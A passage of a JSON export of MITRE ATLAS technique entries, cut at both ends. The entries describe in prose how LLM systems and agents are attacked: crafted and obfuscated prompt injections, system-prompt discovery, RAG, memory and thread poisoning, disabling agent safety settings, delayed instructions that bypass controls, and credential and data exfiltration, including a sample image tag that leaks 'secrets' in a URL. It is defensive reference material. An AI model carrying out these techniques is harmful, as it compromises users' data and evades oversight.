ferences to external data sources.","maturity":"Demonstrated","tactics":["Reconnaissance"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0065","source":"MITRE ATLAS","kind":"technique","name":"LLM Prompt Crafting","description":"Adversaries may use their acquired knowledge of the target generative AI system to craft prompts that bypass its defenses and allow malicious instructions to be executed.\n\nThe adversary may iterate on the prompt to ensure that it works as-intended consistently.","maturity":"Realized","tactics":["Resource Development"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0021","AML.CS0026","AML.CS0029","AML.CS0035","AML.CS0037","AML.CS0038","AML.CS0039","AML.CS0040","AML.CS0041","AML.CS0043","AML.CS0045","AML.CS0046","AML.CS0047","AML.CS0049","AML.CS0051","AML.CS0052","AML.CS0054","AML.CS0056"],"incident_count":3,"modified":"2026-05-27"},{"id":"AML.T0066","source":"MITRE ATLAS","kind":"technique","name":"Retrieval Content Crafting","description":"Adversaries may write content designed to be retrieved by user queries and influence a user of the system in some way. This abuses the trust the user has in the system.\n\nThe crafted content can be combined with a prompt injection. It can also stand alone in a separate document or email. The adversary must get the crafted content into the victim\\u0027s database, such as a vector database used in a retrieval augmented generation (RAG) system. This may be accomplished via cyber access, or by abusing the ingestion mechanisms common in RAG systems (see RAG Poisoning).\n\nLarge language models may be used as an assistant to aid an adversary in crafting content.","maturity":"Demonstrated","tactics":["Resource Development"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026","AML.CS0035"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0067","source":"MITRE ATLAS","kind":"technique","name":"LLM Trusted Output Components Manipulation","description":"Adversaries may utilize prompts to a large language model (LLM) which manipulate various components of its response in order to make it appear trustworthy to the user. This helps the adversary continue to operate in the victim's environment and evade detection by the users it interacts with.\n\nThe LLM may be instructed to tailor its language to appear more trustworthy to the user or attempt to manipulate the user to take certain actions. Other response components that could be manipulated include links, recommended follow-up actions, retrieved document metadata, and Citations.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0041"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0067.000","source":"MITRE ATLAS","kind":"technique","name":"Citations","description":"Adversaries may manipulate the citations provided in an AI system's response, in order to make it appear trustworthy. Variants include citing a providing the wrong citation, making up a new citation, or providing the right citation but for adversary-provided data.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0068","source":"MITRE ATLAS","kind":"technique","name":"LLM Prompt Obfuscation","description":"Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nFor text inputs, this may include modifying how the instructions are rendered such as small text, text colored the same as the background, or hidden HTML elements. For multi-modal inputs, malicious instructions could be hidden in the data itself (e.g. in the pixels of an image) or in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0020","AML.CS0026","AML.CS0040","AML.CS0041","AML.CS0045","AML.CS0046"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0069","source":"MITRE ATLAS","kind":"technique","name":"Discover LLM System Information","description":"The adversary is trying to discover something about the large language model's (LLM) system information. This may be found in a configuration file containing the system instructions or extracted via interactions with the LLM. The desired information may include the full system prompt, special characters that have significance to the LLM or keywords indicating functionality available to the LLM. Information about how the LLM is instructed can be used by the adversary to understand the system's capabilities and to aid them in crafting malicious prompts.","maturity":"Demonstrated","tactics":[],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0069.000","source":"MITRE ATLAS","kind":"technique","name":"Special Character Sets","description":"Adversaries may discover delimiters and special characters sets used by the large language model. For example, delimiters used in retrieval augmented generation applications to differentiate between context and user prompts. These can later be exploited to confuse or manipulate the large language model into misbehaving.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026","AML.CS0051"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0069.001","source":"MITRE ATLAS","kind":"technique","name":"System Instruction Keywords","description":"Adversaries may discover keywords that have special meaning to the large language model (LLM), such as function names or object names. These can later be exploited to confuse or manipulate the LLM into misbehaving and to make calls to plugins the LLM has access to.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026","AML.CS0051"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0069.002","source":"MITRE ATLAS","kind":"technique","name":"System Prompt","description":"Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0048"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0070","source":"MITRE ATLAS","kind":"technique","name":"RAG Poisoning","description":"Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see Gather RAG-Indexed Targets).\n\nThe content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.","maturity":"Demonstrated","tactics":["Persistence"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026","AML.CS0035"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0071","source":"MITRE ATLAS","kind":"technique","name":"False RAG Entry Injection","description":"Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When RAG entry including the false document is retrieved, the LLM is tricked into treating part of the retrieved content as a false RAG result. \n\nBy including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly. \n\nThe adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0026"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0072","source":"MITRE ATLAS","kind":"technique","name":"Reverse Shell","description":"Adversaries may utilize a reverse shell to communicate and control the victim system.\n\nTypically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.","maturity":"Realized","tactics":["Command and Control"],"platforms":["Enterprise"],"attack_reference":null,"references":[],"related_cases":["AML.CS0027","AML.CS0031","AML.CS0052"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0073","source":"MITRE ATLAS","kind":"technique","name":"Impersonation","description":"Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via Phishing, or Spearphishing via Social Engineering LLM) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims.\n\nAdversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.","maturity":"Realized","tactics":["Defense Evasion"],"platforms":["Enterprise"],"attack_reference":"T1656","references":[],"related_cases":["AML.CS0027","AML.CS0033","AML.CS0034","AML.CS0044","AML.CS0053"],"incident_count":3,"modified":"2026-05-27"},{"id":"AML.T0074","source":"MITRE ATLAS","kind":"technique","name":"Masquerading","description":"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.","maturity":"Realized","tactics":["Defense Evasion"],"platforms":["Enterprise"],"attack_reference":"T1036","references":[],"related_cases":["AML.CS0027","AML.CS0044","AML.CS0049","AML.CS0051"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0075","source":"MITRE ATLAS","kind":"technique","name":"Cloud Service Discovery","description":"Adversaries may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), software-as-a-service (SaaS), or AI-as-a-service (AIaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, AI Inference, Generative AI, Agentic AI, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. They may use tools to check credentials and enumerate the AI models available in various AIaaS providers' environments including AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, and GCP Vertex AI .","maturity":"Realized","tactics":["Discovery"],"platforms":["Enterprise"],"attack_reference":"T1526","references":[{"title":"LLMjacking: Stolen Cloud Credentials Used in New AI Attack | Sysdig","url":"https://www.sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack"}],"related_cases":["AML.CS0030"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0076","source":"MITRE ATLAS","kind":"technique","name":"Corrupt AI Model","description":"An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.","maturity":"Realized","tactics":["Defense Evasion"],"platforms":["Predictive AI","Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0031"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0077","source":"MITRE ATLAS","kind":"technique","name":"LLM Response Rendering","description":"An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. \n\nThe adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown\n\nFor example, an LLM may produce the following markdown:\n```\n!ATLAS\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.","maturity":"Demonstrated","tactics":["Exfiltration"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0021","AML.CS0029","AML.CS0035"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0078","source":"MITRE ATLAS","kind":"technique","name":"Drive-by Compromise","description":"Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an LLM Prompt Injection which, when executed, can change the behavior of the AI model.\n\nThe same approach may be used to deliver other types of malicious code that don't target AI directly (See Drive-by Compromise in ATT&CK).","maturity":"Demonstrated","tactics":["Initial Access"],"platforms":["Enterprise"],"attack_reference":"T1189","references":[],"related_cases":["AML.CS0021","AML.CS0045","AML.CS0051","AML.CS0055"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0079","source":"MITRE ATLAS","kind":"technique","name":"Stage Capabilities","description":"Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them. Capabilities may also be staged on web services, such as GitHub, model registries, such as Hugging Face, or container registries.\n\nAdversaries may stage a variety of AI Artifacts including poisoned datasets (Publish Poisoned Datasets, malicious models (Publish Poisoned Models, and prompt injections. They may target names of legitimate companies or products, engage in typosquatting, or use hallucinated entities (Discover LLM Hallucinations).","maturity":"Demonstrated","tactics":["Resource Development"],"platforms":["Enterprise"],"attack_reference":"T1608","references":[],"related_cases":["AML.CS0021","AML.CS0041","AML.CS0045","AML.CS0050","AML.CS0051","AML.CS0055"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0080","source":"MITRE ATLAS","kind":"technique","name":"AI Agent Context Poisoning","description":"Adversaries may attempt to manipulate the context used by an AI agent's large language model (LLM) to influence the responses it generates or actions it takes. This allows an adversary to persistently change the behavior of the target agent and further their goals.\n\nContext poisoning can be accomplished by prompting the an LLM to add instructions or preferences to memory (See Memory) or by simply prompting an LLM that uses prior messages in a thread as part of its context (See Thread).","maturity":"Demonstrated","tactics":[],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0080.000","source":"MITRE ATLAS","kind":"technique","name":"Memory","description":"Adversaries may manipulate the memory of a large language model (LLM) in order to persist changes to the LLM to future chat sessions. \n\nMemory is a common feature in LLMs that allows them to remember information across chat sessions by utilizing a user-specific database. Because the memory is controlled via normal conversations with the user (e.g. \"remember my preference for ...\") an adversary can inject memories via Direct or Indirect Prompt Injection. Memories may contain malicious instructions (e.g. instructions that leak private conversations) or may promote the adversary's hidden agenda (e.g. manipulating the user).","maturity":"Demonstrated","tactics":["Persistence"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0036","AML.CS0040"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0080.001","source":"MITRE ATLAS","kind":"technique","name":"Thread","description":"Adversaries may introduce malicious instructions into a chat thread of a large language model (LLM) to cause behavior changes which persist for the remainder of the thread. A chat thread may continue for an extended period over multiple sessions.\n\nThe malicious instructions may be introduced via Direct or Indirect Prompt Injection. Direct Injection may occur in cases where the adversary has acquired a user's LLM API keys and can inject queries directly into any thread.\n\nAs the token limits for LLMs rise, AI systems can make use of larger context windows which allow malicious instructions to persist longer in a thread.\nThread Poisoning may affect multiple users if the LLM is being used in a service with shared threads. For example, if an agent is active in a Slack channel with multiple participants, a single malicious message from one user can influence the agent's behavior in future interactions with others.","maturity":"Demonstrated","tactics":["Persistence"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0036","AML.CS0051"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0081","source":"MITRE ATLAS","kind":"technique","name":"Modify AI Agent Configuration","description":"Adversaries may modify the configuration files for AI agents on a system. This allows malicious changes to persist beyond the life of a single agent and affects any agents that share the configuration.\n\nConfiguration changes may include modifications to the system prompt, tampering with or replacing knowledge sources, modification to settings of connected tools, and more. Through those changes, an attacker could redirect outputs or tools to malicious services, embed covert instructions that exfiltrate data, or weaken security controls that normally restrict agent behavior.\n\nAdversaries may modify or disable a configuration setting related to security controls, such as those that would prevent the AI Agent from taking actions that may be harmful to the user's system without human-in-the-loop oversight. Disabling AI agent security features may allow adversaries to achieve their malicious goals and maintain long-term corruption of the AI agent.","maturity":"Demonstrated","tactics":["Defense Evasion","Persistence"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0041","AML.CS0050","AML.CS0051"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0082","source":"MITRE ATLAS","kind":"technique","name":"RAG Credential Harvesting","description":"Adversaries may attempt to use their access to a large language model (LLM) on the victim's system to collect credentials. Credentials may be stored in internal documents which can inadvertently be ingested into a RAG database, where they can ultimately be retrieved by an AI agent.","maturity":"Demonstrated","tactics":["Credential Access"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0035"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0083","source":"MITRE ATLAS","kind":"technique","name":"Credentials from AI Agent Configuration","description":"Adversaries may access the credentials of other tools or services on a system from the configuration of an AI agent.\n\nAI Agents often utilize external tools or services to take actions, such as querying databases, invoking APIs, or interacting with cloud resources. To enable these functions, credentials like API keys, tokens, and connection strings are frequently stored in configuration files. While there are secure methods such as dedicated secret managers or encrypted vaults that can be deployed to store and manage these credentials, in practice they are often placed in less protected locations for convenience or ease of deployment. If an attacker can read or extract these configurations, they may obtain valid credentials that allow direct access to sensitive systems outside the agent itself.","maturity":"Demonstrated","tactics":["Credential Access"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0045","AML.CS0048"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0084","source":"MITRE ATLAS","kind":"technique","name":"Discover AI Agent Configuration","description":"Adversaries may attempt to discover configuration information for AI agents present on the victim's system. Agent configurations can include tools or services they have access to.\n\nAdversaries may directly access agent configuring dashboards or configuration files. They may also obtain configuration details by prompting the agent with questions such as \"What tools do you have access to?\"\n\nAdversaries can use the information they discover about AI agents to help with targeting.","maturity":"Demonstrated","tactics":[],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0084.000","source":"MITRE ATLAS","kind":"technique","name":"Embedded Knowledge","description":"Adversaries may attempt to discover the data sources a particular agent can access.  The AI agent's configuration may reveal data sources or knowledge.\n\nThe embedded knowledge may include sensitive or proprietary material such as intellectual property, customer data, internal policies, or even credentials. By mapping what knowledge an agent has access to, an adversary can better understand the AI agent's role and potentially expose confidential information or pinpoint high-value targets for further exploitation.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0037"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0084.001","source":"MITRE ATLAS","kind":"technique","name":"Tool Definitions","description":"Adversaries may discover the tools the AI agent has access to. By identifying which tools are available, the adversary can understand what actions may be executed through the agent and what additional resources it can reach. This knowledge may reveal access to external data sources such as OneDrive or SharePoint, or expose exfiltration paths like the ability to send emails, helping adversaries identify AI agents that provide the greatest value or opportunity for attack.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0037"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0084.002","source":"MITRE ATLAS","kind":"technique","name":"Activation Triggers","description":"Adversaries may discover keywords or other triggers (such as incoming emails, documents being added, incoming message, or other workflows) that activate an agent and may cause it to run additional actions.\n\nUnderstanding these triggers can reveal how the AI agent is activated and controlled. This may also expose additional paths for compromise, as an adversary could attempt to trigger the agent from outside its environment and drive it to perform unintended or malicious actions.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0037"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0084.003","source":"MITRE ATLAS","kind":"technique","name":"Call Chains","description":"Adversaries may extract call chains from AI agent configurations, which can reveal potentially targets for remote code execution (RCE) or other vulnerabilities. Vulnerable call chains often connect user inputs or LLM outputs to an execution sink (e.g. exec, eval, os.popen). The vulnerabilities may be later exploited via LLM Prompt Injection.\n\nAdversaries may systematically identify potentially vulnerable call chains present in LLM frameworks, then scan for applications that are configured to use these call chains for targeting .","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Agentic AI"],"attack_reference":null,"references":[{"title":"[2309.02926] Demystifying RCE Vulnerabilities in LLM-Integrated Apps","url":"https://arxiv.org/abs/2309.02926"}],"related_cases":["AML.CS0052"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0085","source":"MITRE ATLAS","kind":"technique","name":"Data from AI Services","description":"Adversaries may use their access to a victim organization's AI-enabled services to collect proprietary or otherwise sensitive information. As organizations adopt generative AI in centralized services for accessing an organization's data, such as with chat agents which can access retrieval augmented generation (RAG) databases and other data sources via tools, they become increasingly valuable targets for adversaries.\n\nAI agents may be configured to have access to tools and data sources that are not directly accessible by users. Adversaries may abuse this to collect data that a regular user wouldn't be able to access directly.","maturity":"Demonstrated","tactics":[],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0085.000","source":"MITRE ATLAS","kind":"technique","name":"RAG Databases","description":"Adversaries may prompt the AI service to retrieve data from a RAG database. This can include the majority of an organization's internal documents.","maturity":"Demonstrated","tactics":["Collection"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0037"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0085.001","source":"MITRE ATLAS","kind":"technique","name":"AI Agent Tools","description":"Adversaries may prompt the AI service to invoke various tools the agent has access to. Tools may retrieve data from different APIs or services in an organization.","maturity":"Demonstrated","tactics":["Collection"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0037","AML.CS0038","AML.CS0039"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0086","source":"MITRE ATLAS","kind":"technique","name":"Exfiltration via AI Agent Tool Invocation","description":"AI agent tools capable of performing write operations may be invoked to exfiltrate data to an adversary. Sensitive information can be encoded into the tool's input parameters and transmitted to an adversary-controlled location (such as an inbox, document, or server) as part of a seemingly legitimate action. Variants include sending emails, creating or modifying documents, updating CRM records, or even generating media such as images or videos.\n\nThe invoked tool itself may be legitimate but invoked by an adversary via LLM Prompt Injection, or the tool may be malicious (See AI Agent Tool Poisoning.\n\nAI Agent Tool Poisoning can also be used manipulate the inputs and destination of a separate legitimate tool, invoked through normal usage by the victim.","maturity":"Realized","tactics":["Exfiltration"],"platforms":["Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0037","AML.CS0039","AML.CS0045","AML.CS0053","AML.CS0054"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0087","source":"MITRE ATLAS","kind":"technique","name":"Gather Victim Identity Information","description":"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, photos, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation, Search Victim-Owned Websites, or via leaked information on the black market.\n\nAdversaries may use the gathered victim data to Create Deepfakes and impersonate them in a convincing manner. This may create opportunities for adversaries to Establish Accounts under the impersonated identity, or allow them to perform convincing Phishing attacks.","maturity":"Realized","tactics":["Reconnaissance"],"platforms":["Enterprise"],"attack_reference":"T1589","references":[],"related_cases":["AML.CS0004","AML.CS0033","AML.CS0034"],"incident_count":2,"modified":"2026-05-27"},{"id":"AML.T0088","source":"MITRE ATLAS","kind":"technique","name":"Generate Deepfakes","description":"Adversaries may use generative artificial intelligence (GenAI) to create synthetic media (i.e. imagery, video, audio, and text) that appear authentic. These \"[deepfakes]( https://en.wikipedia.org/wiki/Deepfake)\" may mimic a real person or depict fictional personas. Adversaries may use deepfakes for impersonation to conduct Phishing or to evade AI applications such as biometric identity verification systems (see Evade AI Model).\n\nManipulation of media has been possible for a long time, however GenAI reduces the skill and level of effort required, allowing adversaries to rapidly scale operations to target more users or systems. It also makes real-time manipulations feasible.\n\nAdversaries may utilize open-source models and software that were designed for legitimate use cases to generate deepfakes for malicious use. However, there are some projects specifically tailored towards malicious use cases such as ProKYC.","maturity":"Realized","tactics":["AI Attack Staging"],"platforms":["Predictive AI","Enterprise"],"attack_reference":null,"references":[],"related_cases":["AML.CS0033","AML.CS0034"],"incident_count":1,"modified":"2026-05-27"},{"id":"AML.T0089","source":"MITRE ATLAS","kind":"technique","name":"Process Discovery","description":"Adversaries may attempt to get information about processes running on a system. Once obtained, this information could be used to gain an understanding of common AI-related software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details.\n\nIdentifying the AI software stack can then lead an adversary to new targets and attack pathways. AI-related software may require application tokens to authenticate with backend services. This provides opportunities for Credential Access and Lateral Movement.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or `Get-Process` via PowerShell. Information about processes can also be extracted from the output of Native API calls such as `CreateToolhelp32Snapshot`. In Mac and Linux, this is accomplished with the `ps` command. Adversaries may also opt to enumerate processes via `/proc`.","maturity":"Demonstrated","tactics":["Discovery"],"platforms":["Enterprise"],"attack_reference":"T1057","references":[],"related_cases":["AML.CS0036"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0090","source":"MITRE ATLAS","kind":"technique","name":"OS Credential Dumping","description":"Adversaries may extract credentials from OS caches, application memory, or other sources on a compromised system. Credentials are often in the form of a hash or clear text, and can include usernames and passwords, application tokens, or other authentication keys.\n\nCredentials can be used to perform Lateral Movement to access other AI services such as AI agents, LLMs, or AI inference APIs. Credentials could also give an adversary access to other software tools and data sources that are part of the AI DevOps lifecycle.","maturity":"Demonstrated","tactics":["Credential Access"],"platforms":["Enterprise"],"attack_reference":"T1003","references":[],"related_cases":["AML.CS0036"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0091","source":"MITRE ATLAS","kind":"technique","name":"Use Alternate Authentication Material","description":"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.\n\nAI services commonly use alternate authentication material as a primary means for users to make queries, making them vulnerable to this technique.","maturity":"Demonstrated","tactics":[],"platforms":["Enterprise"],"attack_reference":"T1550","references":[],"related_cases":[],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0091.000","source":"MITRE ATLAS","kind":"technique","name":"Application Access Token","description":"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, software-as-a-service (SaaS), and AI-as-a-service(AIaaS). They are commonly used for AI services such as chatbots, LLMs, and predictive inference APIs.","maturity":"Demonstrated","tactics":["Lateral Movement"],"platforms":["Enterprise"],"attack_reference":"T1550.001","references":[],"related_cases":["AML.CS0036"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0092","source":"MITRE ATLAS","kind":"technique","name":"Manipulate User LLM Chat History","description":"Adversaries may manipulate a user's large language model (LLM) chat history to cover the tracks of their malicious behavior. They may hide persistent changes they have made to the LLM's behavior, or obscure their attempts at discovering private information about the user.\n\nTo do so, adversaries may delete or edit existing messages or create new threads as part of their coverup. This is feasible if the adversary has the victim's authentication tokens for the backend LLM service or if they have direct access to the victim's chat interface. \n\nChat interfaces (especially desktop interfaces) often do not show the injected prompt for any ongoing chat, as they update chat history only once when initially opening it. This can help the adversary's manipulations go unnoticed by the victim.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0036","AML.CS0048"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0093","source":"MITRE ATLAS","kind":"technique","name":"Prompt Infiltration via Public-Facing Application","description":"An adversary may introduce malicious prompts into the victim's system via a public-facing application with the intention of it being ingested by an AI at some point in the future and ultimately having a downstream effect. This may occur when a data source is indexed by a retrieval augmented generation (RAG) system, when a rule triggers an action by an AI agent, or when a user utilizes a large language model (LLM) to interact with the malicious content. The malicious prompts may persist on the victim system for an extended period and could affect multiple users and various AI tools within the victim organization.\n\nAny public-facing application that accepts text input could be a target. This includes email, shared document systems like OneDrive or Google Drive, and service desks or ticketing systems like Jira. This also includes OCR-mediated infiltration where malicious instructions are embedded in images, screenshots, and invoices that are ingested into the system.\n\nAdversaries may perform Reconnaissance to identify public facing applications that are likely monitored by an AI agent or are likely to be indexed by a RAG. They may perform Discover AI Agent Configuration to refine their targeting.","maturity":"Demonstrated","tactics":["Initial Access","Persistence"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0016","AML.CS0026","AML.CS0029","AML.CS0037","AML.CS0038","AML.CS0039","AML.CS0040","AML.CS0046"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0094","source":"MITRE ATLAS","kind":"technique","name":"Delay Execution of LLM Instructions","description":"Adversaries may include instructions to be followed by the AI system in response to a future event, such as a specific keyword or the next interaction, in order to evade detection or bypass controls placed on the AI system.\n\nFor example, an adversary may include \"If the user submits a new request...\" followed by the malicious instructions as part of their prompt.\n\nAI agents can include security measures against prompt injections that prevent the invocation of particular tools or access to certain data sources during a conversation turn that has untrusted data in context. Delaying the execution of instructions to a future interaction or keyword is one way adversaries may bypass this type of control.","maturity":"Demonstrated","tactics":["Defense Evasion"],"platforms":["Generative AI","Agentic AI"],"attack_reference":null,"references":[],"related_cases":["AML.CS0038"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0095","source":"MITRE ATLAS","kind":"technique","name":"Search Open Websites/Domains","description":"Adversaries may search public websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or domains owned by the victim.\n\nAdversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by Exploit Public-Facing Application or Prompt Infiltration via Public-Facing Application.","maturity":"Demonstrated","tactics":["Reconnaissance"],"platforms":["Enterprise"],"attack_reference":"T1593","references":[],"related_cases":["AML.CS0039"],"incident_count":0,"modified":"2026-05-27"},{"id":"AML.T0095.000","source":"MITRE 